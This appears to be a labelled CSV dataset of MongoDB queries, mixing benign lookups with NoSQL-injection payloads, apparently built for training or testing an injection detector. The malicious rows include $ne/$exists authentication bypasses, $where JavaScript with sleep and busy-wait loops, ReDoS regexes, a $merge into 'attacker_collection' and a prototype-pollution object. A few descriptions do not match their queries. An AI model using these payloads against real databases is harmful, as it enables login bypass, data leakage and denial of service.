id,label,type,collection,query,full_command,description,timestamp
1,benign,count_query,articles,{},db.articles.countDocuments({}),Document count query,2025-11-24T21:15:54.420691
2,malicious,or_injection,orders,"{""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]}","db.orders.find({""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.340016
3,malicious,json_injection,transactions,"{""$and"": [{""username"": ""admin""}, {""$where"": ""1==1""}]}","db.transactions.find({""$and"": [{""username"": ""admin""}, {""$where"": ""1==1""}]})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.304339
4,malicious,regex_injection,users,"{""status"": {""$regex"": "".{1,1000000}""}}","db.users.find({""status"": {""$regex"": "".{1,1000000}""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.359237
5,benign,find_with_limit,articles,"{""status"": ""active""}","db.articles.find({""status"": ""active""}).skip(47).limit(41)",Query with pagination,2025-11-24T21:15:54.522481
6,malicious,comment_injection,users,"{""username"": ""admin'--"", ""password"": ""anything""}","db.users.find({""username"": ""admin'--"", ""password"": ""anything""})",Attempting to bypass filters through comment syntax,2025-11-24T21:15:54.298898
7,malicious,regex_injection,transactions,"{""admin"": {""$regex"": "".{1,1000000}""}}","db.transactions.find({""admin"": {""$regex"": "".{1,1000000}""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.316148
8,benign,find_with_limit,products,"{""status"": ""active""}","db.products.find({""status"": ""active""}).skip(387).limit(23)",Query with pagination,2025-11-24T21:15:54.383721
9,malicious,regex_injection,products,"{""token"": {""$regex"": ""([a-zA-Z]+)*$""}}","db.products.find({""token"": {""$regex"": ""([a-zA-Z]+)*$""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.335008
10,malicious,where_injection,accounts,"{""$where"": ""this.username == 'admin'""}","db.accounts.find({""$where"": ""this.username == 'admin'""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.323844
11,malicious,where_injection,logs,"{""$where"": ""sleep(5000)""}","db.logs.find({""$where"": ""sleep(5000)""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.301360
12,malicious,aggregation_injection,logs,"[{""$match"": {}}, {""$merge"": {""into"": ""attacker_collection""}}]","db.logs.aggregate([{""$match"": {}}, {""$merge"": {""into"": ""attacker_collection""}}])",Injecting malicious operations through aggregation pipeline,2025-11-24T21:15:54.358965
13,malicious,or_injection,accounts,"{""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]}","db.accounts.find({""username"": ""victim"", ""$or"": [{""password"": """"}, {""password"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.294598
14,benign,simple_find,sessions,"{""order_id"": ""b776cbf6-2014-4450-ae22-c5bbb1c36cb3""}","db.sessions.find({""order_id"": ""b776cbf6-2014-4450-ae22-c5bbb1c36cb3""})",Simple field match query,2025-11-24T21:15:54.447015
15,malicious,or_injection,products,"{""$or"": [{}, {""_id"": {""$exists"": true}}]}","db.products.find({""$or"": [{}, {""_id"": {""$exists"": true}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.349641
16,benign,distinct_query,products,"{""field"": ""country""}","db.products.distinct(""country"")",Field distinct query,2025-11-24T21:15:54.471018
17,benign,find_with_limit,users,"{""status"": ""active""}","db.users.find({""status"": ""active""}).skip(205).limit(61)",Query with pagination,2025-11-24T21:15:54.513887
18,benign,find_with_sort,users,{},"db.users.find({}).sort({""name"": 1})",Query with sorting,2025-11-24T21:15:54.429194
19,benign,insert_query,products,"{""name"": ""Ameliorated attitude-oriented orchestration"", ""price"": 801.43, ""category"": ""clothing"", ""stock"": 588, ""rating"": 4.2, ""brand"": ""Hawkins, Green and Smith""}","db.products.insertOne({""name"": ""Ameliorated attitude-oriented orchestration"", ""price"": 801.43, ""category"": ""clothing"", ""stock"": 588, ""rating"": 4.2, ""brand"": ""Hawkins, Green and Smith""})",Document insert operation,2025-11-24T21:15:54.524870
20,benign,simple_find,orders,"{""email"": ""fshi@example.com""}","db.orders.find({""email"": ""fshi@example.com""})",Simple field match query,2025-11-24T21:15:54.441887
21,benign,find_with_sort,users,{},"db.users.find({}).sort({""rating"": -1, ""price"": 1})",Query with sorting,2025-11-24T21:15:54.515467
22,malicious,operator_injection,orders,"{""id"": {""$exists"": true, ""$ne"": null}}","db.orders.find({""id"": {""$exists"": true, ""$ne"": null}})",Using $gt operator to bypass authentication or leak data,2025-11-24T21:15:54.358442
23,benign,simple_find,sessions,"{""price"": 75.45}","db.sessions.find({""price"": 75.45})",Simple field match query,2025-11-24T21:15:54.480914
24,benign,find_with_limit,articles,"{""status"": ""active""}","db.articles.find({""status"": ""active""}).skip(179).limit(90)",Query with pagination,2025-11-24T21:15:54.409834
25,malicious,operator_injection,sessions,"{""token"": {""$lt"": """"}}","db.sessions.find({""token"": {""$lt"": """"}})",Using $lt operator to bypass authentication or leak data,2025-11-24T21:15:54.360452
26,malicious,or_injection,customers,"{""$or"": [{}, {""_id"": {""$exists"": true}}]}","db.customers.find({""$or"": [{}, {""_id"": {""$exists"": true}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.313411
27,malicious,type_confusion,orders,"{""role"": {}}","db.orders.find({""role"": {}})",Exploiting type system for injection attack,2025-11-24T21:15:54.322165
28,malicious,where_injection,sessions,"{""$where"": ""this.a == this.b || 1==1""}","db.sessions.find({""$where"": ""this.a == this.b || 1==1""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.316421
29,malicious,where_injection,logs,"{""$where"": ""function() { var x = this.password; return x.match(/.*/) }""}","db.logs.find({""$where"": ""function() { var x = this.password; return x.match(/.*/) }""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.333752
30,malicious,json_injection,products,"{""$and"": [{""username"": ""admin""}, {""$where"": ""1==1""}]}","db.products.find({""$and"": [{""username"": ""admin""}, {""$where"": ""1==1""}]})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.353737
31,benign,distinct_query,comments,"{""field"": ""country""}","db.comments.distinct(""country"")",Field distinct query,2025-11-24T21:15:54.495131
32,malicious,or_injection,sessions,"{""$or"": [{""admin"": true}, {""admin"": {""$exists"": false}}]}","db.sessions.find({""$or"": [{""admin"": true}, {""admin"": {""$exists"": false}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.320955
33,malicious,operator_injection,sessions,"{""email"": {""$exists"": true, ""$ne"": null}}","db.sessions.find({""email"": {""$exists"": true, ""$ne"": null}})",Using $ne operator to bypass authentication or leak data,2025-11-24T21:15:54.324594
34,benign,simple_find,orders,"{""category"": ""clothing""}","db.orders.find({""category"": ""clothing""})",Simple field match query,2025-11-24T21:15:54.554117
35,malicious,json_injection,sessions,"{""constructor"": {""prototype"": {""admin"": true}}}","db.sessions.find({""constructor"": {""prototype"": {""admin"": true}}})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.356903
36,benign,find_with_limit,articles,"{""status"": ""active""}","db.articles.find({""status"": ""active""}).skip(46).limit(65)",Query with pagination,2025-11-24T21:15:54.382615
37,malicious,or_injection,accounts,"{""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]}","db.accounts.find({""$or"": [{""a"": ""a""}, {""b"": {""$ne"": """"}}]})",Bypassing condition restrictions using $or operator,2025-11-24T21:15:54.311983
38,malicious,regex_injection,customers,"{""status"": {""$regex"": "".{1,1000000}""}}","db.customers.find({""status"": {""$regex"": "".{1,1000000}""}})",Using malicious regex for ReDoS attack or data leakage,2025-11-24T21:15:54.310720
39,benign,find_with_sort,users,{},"db.users.find({}).sort({""rating"": -1, ""price"": 1})",Query with sorting,2025-11-24T21:15:54.452833
40,benign,find_with_projection,products,"{""status"": ""active""}","db.products.find({""status"": ""active""}, {""username"": 1, ""created_at"": 1})",Query with field projection,2025-11-24T21:15:54.529680
41,malicious,array_injection,users,"{""username"": {""$all"": [{""$elemMatch"": {""$gt"": """"}}]}}","db.users.find({""username"": {""$all"": [{""$elemMatch"": {""$gt"": """"}}]}})",Injection through array operators,2025-11-24T21:15:54.317050
42,benign,simple_find,sessions,"{""_id"": ""cb1fa573-bc88-4208-9373-c0730b91eff6""}","db.sessions.find({""_id"": ""cb1fa573-bc88-4208-9373-c0730b91eff6""})",Simple field match query,2025-11-24T21:15:54.521603
43,malicious,where_injection,logs,"{""$where"": ""(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<5000); return true;})()""}","db.logs.find({""$where"": ""(function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<5000); return true;})()""})",Injecting JavaScript code via $where clause,2025-11-24T21:15:54.301914
44,malicious,json_injection,logs,"{""username"": ""admin"", ""$or"": [{""1"": ""1""}]}","db.logs.find({""username"": ""admin"", ""$or"": [{""1"": ""1""}]})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.356070
45,malicious,json_injection,orders,"{""username"": ""admin"", ""$or"": [{""1"": ""1""}]}","db.orders.find({""username"": ""admin"", ""$or"": [{""1"": ""1""}]})",Manipulating query logic through JSON structure,2025-11-24T21:15:54.353345
46,benign,find_with_limit,customers,"{""status"": ""active""}","db.customers.find({""status"": ""active""}).skip(334).limit(69)",Query with pagination,2025-11-24T21:15:54.548071
47,benign,find_with_limit,customers,"{""status"": ""active""}","db.customers.find({""status"": ""active""}).skip(274).limit(32)",Query with pagination,2025-11-24T21:15:54.494305
